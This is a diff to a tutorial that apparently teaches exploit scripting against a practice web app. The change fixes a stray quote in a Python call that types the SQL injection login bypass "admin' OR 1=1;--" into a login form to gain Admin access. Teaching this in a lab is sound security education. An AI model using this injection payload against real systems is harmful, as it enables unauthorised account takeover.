@@ -45,7 +45,7 @@ We can use ``admin' OR 1=1;--`` for the username and literally anything for the 
 other three arguments to the function, we'll need to dig into the HTML source and copy the XPaths of
 the username and password fields, as well as the submit button. ::
 
-    first_exploit.login("/#/login", "admin' OR 1=1;--", "password", '//*[@id="email"]', '//*[@id="password"]', '//*[@id="loginButton"]'')
+    first_exploit.login("/#/login", "admin' OR 1=1;--", "password", '//*[@id="email"]', '//*[@id="password"]', '//*[@id="loginButton"]')
 
 Save the program and run it. You should see a Firefox browser pop up and in a few seconds, you'll 
 be logged in as Admin.
